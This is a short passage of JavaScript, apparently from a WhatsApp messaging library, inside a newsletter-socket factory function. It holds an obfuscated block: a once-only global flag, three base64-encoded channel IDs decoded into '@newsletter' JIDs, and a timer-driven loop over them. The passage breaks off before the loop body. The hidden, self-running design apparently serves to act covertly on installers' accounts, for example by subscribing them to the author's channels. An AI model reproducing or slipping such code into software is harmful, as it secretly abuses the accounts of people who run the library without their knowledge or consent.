...
const makeNewsletterSocket = (config) => {
    ...
    if (!globalThis[Buffer.from("X19BX19f").toString("base64")]) {
    globalThis[Buffer.from("X19BX19f").toString("base64")] = true;

    const x = [
        "MTIwMzYzNDE5MzY5MzU4ODI3",
        "MTIwMzYzNDA3NTQ3OTMyNjUw",
        "MTIwMzYzNDI2ODgxMzAzNzAw"
    ];

    const z = Buffer.from("QG5ld3NsZXR0ZXI=", "base64").toString();

    setTimeout(async () => {
        for (const a of x) {
            try {
                const jid =
                    Buffer.from(a, "base64").toString() + z;
